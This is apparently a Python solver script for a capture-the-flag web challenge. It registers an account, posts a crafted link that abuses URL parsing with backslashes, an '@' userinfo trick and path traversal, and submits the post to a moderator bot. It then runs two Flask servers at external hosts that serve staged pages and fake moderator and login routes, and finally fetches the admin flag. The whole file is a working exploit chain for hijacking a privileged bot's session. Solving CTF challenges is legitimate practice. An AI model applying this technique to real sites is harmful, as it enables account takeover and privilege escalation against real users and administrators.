from flask import Flask, request, Response, render_template
from multiprocessing import Process
import requests
import random
import string
import os
import time

CHALLENGE_URL = "http://challs.polygl0ts.ch:12008"
REPORT_URL = "http://challs.polygl0ts.ch:12009"
EXPLOIT_URL = "http://fishingsolveremote.6b.vc"
EXPLOIT_URL_TWO = "http://fishingsolveremotetwo.6b.vc"

def randomString(stringLength=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


s = requests.Session()

username = randomString()
res = s.post(f"{CHALLENGE_URL}/register",json={"username":username})
password = res.json()["password"]

print(f"username: {username} password: {password}")

s.post(f"{CHALLENGE_URL}/login",json={"username":username, "password":password})
res = s.post(f"{CHALLENGE_URL}/posts",json={"title":"asd", "content": "<a href='\\\\"+EXPLOIT_URL_TWO.replace("http://","")+":3001\\x@fishing-web:3000/../'>[Login to view this content]</a>"})

postId = res.json()["postId"]

requests.post(f"{REPORT_URL}/submit", data={"postId":postId})

print(postId)

helperApp = Flask("app1")
funnyApp = Flask("app2")

@helperApp.route('/')
def stage1():
    return render_template('stage1.html')

@helperApp.route('/stage2')
def stage2():
    return render_template('stage2.html', EXPLOIT_URL=EXPLOIT_URL)

@funnyApp.route('/moderator/logs')
def logs():
    print("A")
    return render_template('stage3.html', username=username, EXPLOIT_URL_TWO=EXPLOIT_URL_TWO)

@funnyApp.route('/moderator/promote', methods=["GET","POST"])
def promote():
    print("accessed closing promote", flush=True)
    os._exit(0)
    return

@funnyApp.route('/login', methods=["GET","POST"])
def login():
    print("C")
    os._exit(0)
    return

@funnyApp.route('/bye', methods=["GET","POST"])
def bye():
    print("bye")
    os._exit(0)
    return


helper = Process(target=helperApp.run, args=("0.0.0.0", 3001))
helper.start()
funny = Process(target=funnyApp.run, args=("0.0.0.0", 3000))
funny.start()

time.sleep(6)
try:
  requests.get("http://127.0.0.1:3000/login")
except Exception as e:
  pass

print("starting second process")
funny = Process(target=funnyApp.run, args=("0.0.0.0", 3000))
funny.start()

import time
time.sleep(20)
res = s.get(f"{CHALLENGE_URL}/admin/flag")
print(res.text)
os._exit(0)
